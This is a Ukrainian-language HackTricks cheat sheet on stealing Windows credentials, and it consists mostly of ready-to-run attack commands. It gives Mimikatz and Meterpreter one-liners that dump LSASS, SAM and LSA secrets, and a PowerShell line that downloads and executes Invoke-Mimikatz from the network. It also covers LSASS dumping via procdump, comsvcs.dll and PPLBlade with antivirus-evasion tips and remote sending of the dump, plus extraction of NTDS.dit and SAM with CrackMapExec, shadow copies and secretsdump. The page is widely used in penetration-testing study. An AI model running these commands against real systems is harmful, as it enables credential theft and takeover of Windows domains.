# Викрадення облікових даних Windows

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити **рекламу вашої компанії на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.

</details>

## Викрадення облікових даних Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Знайдіть інші можливості Mimikatz у** [**цій сторінці**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Дізнайтеся про деякі можливі заходи захисту облікових даних тут.**](credentials-protections.md) **Ці заходи можуть запобігти вилученню деяких облікових даних Mimikatz.**

## Облікові дані з Meterpreter

Використовуйте [**Плагін облікових даних**](https://github.com/carlospolop/MSF-Credentials) **, який я створив для** пошуку паролів та хешів **в середині жертви.**
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Обхід Антивіруса

### Procdump + Mimikatz

Оскільки **Procdump від** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є легітимним інструментом Microsoft**, він не виявляється захисником.\
Ви можете використовувати цей інструмент для **вивантаження процесу lsass**, **завантажити дамп** та **витягти** **облікові дані локально** з дампу.

{% code title="Вивантаження lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Витягнення облікових даних з дампу" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Цей процес виконується автоматично за допомогою [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Примітка**: Деякі **AV** можуть **виявити** як **шкідливе** використання **procdump.exe для вивантаження lsass.exe**, це через те, що вони **виявляють** рядок **"procdump.exe" та "lsass.exe"**. Тому краще **передати** як **аргумент** **PID** lsass.exe до procdump **замість** імені lsass.exe.

### Вивантаження lsass за допомогою **comsvcs.dll**

DLL-файл з назвою **comsvcs.dll**, знайдений в `C:\Windows\System32`, відповідає за **вивантаження пам'яті процесу** у разі аварії. Цей DLL включає **функцію** з назвою **`MiniDumpW`**, призначену для виклику за допомогою `rundll32.exe`.\
Перші два аргументи не мають значення, але третій розділений на три компоненти. PID процесу, який потрібно вивантажити, становить перший компонент, місце розташування файлу вивантаження - другий, а третій компонент - строго слово **full**. Інших варіантів не існує.\
Після обробки цих трьох компонентів DLL займається створенням файлу вивантаження та передачею пам'яті вказаного процесу в цей файл.\
Використання **comsvcs.dll** можливе для вивантаження процесу lsass, тим самим усуваючи необхідність завантажувати та виконувати procdump. Цей метод детально описаний за посиланням [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Для виконання використовується наступна команда:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Ви можете автоматизувати цей процес за допомогою** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Витяг lsass за допомогою диспетчера завдань**

1. Клацніть правою кнопкою миші на панелі завдань та виберіть Диспетчер завдань
2. Клацніть на Деталі
3. Знайдіть процес "Процес локальної служби безпеки" на вкладці Процеси
4. Клацніть правою кнопкою миші на процесі "Процес локальної служби безпеки" та виберіть "Створити файл дампу". 

### Витяг lsass за допомогою procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) - це підписаний компанією Microsoft бінарний файл, який є частиною набору [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Витяг lsass за допомогою PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) - це інструмент для вилучення захищених процесів, який підтримує затемнення дампу пам'яті та передачу його на віддалені робочі станції без зберігання на диску.

**Основні функціональні можливості**:

1. Обхід захисту PPL
2. Затемнення файлів дампу пам'яті для ухилення від механізмів виявлення за підписами Defender
3. Завантаження дампу пам'яті за допомогою методів завантаження RAW та SMB без зберігання на диску (безфайловий дамп)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Витягнення хешів SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Витягнення секретів LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Витягнути NTDS.dit з цільового DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Витягнути історію паролів NTDS.dit з цільового DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Показати атрибут pwdLastSet для кожного облікового запису NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Викрадення SAM & SYSTEM

Ці файли повинні бути **розташовані** в _C:\windows\system32\config\SAM_ та _C:\windows\system32\config\SYSTEM._ Але **ви не можете просто скопіювати їх звичайним способом**, оскільки вони захищені.

### З реєстру

Найпростіший спосіб вкрасти ці файли - отримати копію з реєстру:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Завантажте** ці файли на свій комп'ютер Kali та **витягніть хеші** за допомогою:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Тіньова копія тому

Ви можете виконати копію захищених файлів, використовуючи цю службу. Вам потрібно мати права адміністратора.

#### Використання vssadmin

Бінарний файл vssadmin доступний лише в версіях Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Але ви можете зробити те саме з **Powershell**. Це приклад **як скопіювати файл SAM** (жорсткий диск, який використовується - "C:", і він зберігається в C:\users\Public), але ви можете використовувати це для копіювання будь-якого захищеного файлу:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Код з книги: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Наостанок, ви також можете скористатися [**PS скриптом Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), щоб зробити копію SAM, SYSTEM та ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Активні креденціали директорії - NTDS.dit**

Файл **NTDS.dit** відомий як серце **Active Directory**, що містить важливі дані про об'єкти користувачів, групи та їх членство. Це місце, де зберігаються **хеші паролів** для користувачів домену. Цей файл є базою даних **Extensible Storage Engine (ESE)** і розташовується в **_%SystemRoom%/NTDS/ntds.dit_**.

У цій базі даних підтримуються три основні таблиці:

- **Таблиця даних**: Ця таблиця відповідає за зберігання деталей про об'єкти, такі як користувачі та групи.
- **Таблиця посилань**: Вона відстежує взаємозв'язки, такі як членство в групах.
- **Таблиця SD**: Тут зберігаються **дескриптори безпеки** для кожного об'єкта, забезпечуючи безпеку та контроль доступу до збережених об'єктів.

Додаткова інформація про це: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows використовує _Ntdsa.dll_ для взаємодії з цим файлом, і його використовує _lsass.exe_. Тоді **частина** файлу **NTDS.dit** може бути розташована **в пам'яті `lsass`** (можна знайти останні дані, які були доступні, ймовірно, через покращення продуктивності за допомогою **кешу**).

#### Розшифрування хешів всередині NTDS.dit

Хеш шифрується 3 рази:

1. Розшифрування ключа шифрування пароля (**PEK**) за допомогою **BOOTKEY** та **RC4**.
2. Розшифрування **хешу** за допомогою **PEK** та **RC4**.
3. Розшифрування **хешу** за допомогою **DES**.

**PEK** має **одне значення** на **кожному контролері домену**, але він **шифрується** всередині файлу **NTDS.dit** за допомогою **BOOTKEY** з файлу **SYSTEM контролера домену (відрізняється між контролерами домену)**. Тому для отримання креденціалів з файлу NTDS.dit **потрібні файли NTDS.dit та SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Копіювання NTDS.dit за допомогою Ntdsutil

Доступно з Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Ви також можете використати трюк з [**копіюванням тіньової копії тому**](./#stealing-sam-and-system), щоб скопіювати файл **ntds.dit**. Пам'ятайте, що вам також знадобиться копія файлу **SYSTEM** (знову, [**витягніть його з реєстру або використовуйте трюк з копіюванням тіньової копії тому**](./#stealing-sam-and-system)).

### **Вилучення хешів з NTDS.dit**

Після того, як ви **отримали** файли **NTDS.dit** та **SYSTEM**, ви можете використовувати інструменти, такі як _secretsdump.py_, для **вилучення хешів**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ви також можете **витягти їх автоматично**, використовуючи дійсного користувача домену з правами адміністратора:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Для **великих файлів NTDS.dit** рекомендується витягти їх за допомогою [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Крім того, ви можете використовувати **модуль metasploit**: _post/windows/gather/credentials/domain\_hashdump_ або **mimikatz** `lsadump::lsa /inject`

### **Вилучення об'єктів домену з NTDS.dit до бази даних SQLite**

Об'єкти NTDS можуть бути вилучені до бази даних SQLite за допомогою [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Не лише вилучаються секрети, але й усі об'єкти та їх атрибути для подальшого вилучення інформації, коли вже отримано сирі файли NTDS.dit.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` гілка є необов'язковою, але дозволяє розшифрувати секрети (хеші NT та LM, додаткові облікові дані, такі як паролі у відкритому вигляді, ключі Kerberos або довіри, історія паролів NT та LM). Разом з іншою інформацією, витягуються наступні дані: облікові записи користувачів та машин з їх хешами, прапорці UAC, мітки часу для останнього входу та зміни пароля, опис облікових записів, імена, UPN, SPN, групи та рекурсивні членства, дерево організаційних одиниць та членство, довірені домени з типами довіри, напрямком та атрибутами...

## Lazagne

Завантажте виконуючий файл з [тут](https://github.com/AlessandroZ/LaZagne/releases). Ви можете використовувати цей виконуючий файл для вилучення облікових даних з кількох програм.
```
lazagne.exe all
```
## Інші інструменти для витягування облікових даних з SAM та LSASS

### Редактор облікових даних Windows (WCE)

Цей інструмент може бути використаний для вилучення облікових даних з пам'яті. Завантажте його з: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Вилучення облікових даних з файлу SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Витягнути облікові дані з файлу SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Завантажте його з [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) і просто **виконайте його**, тоді паролі будуть видобуті.

## Захист

[**Дізнайтеся про деякі заходи захисту облікових даних тут.**](credentials-protections.md)

<details>

<summary><strong>Дізнайтеся про взлом AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити свою **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>
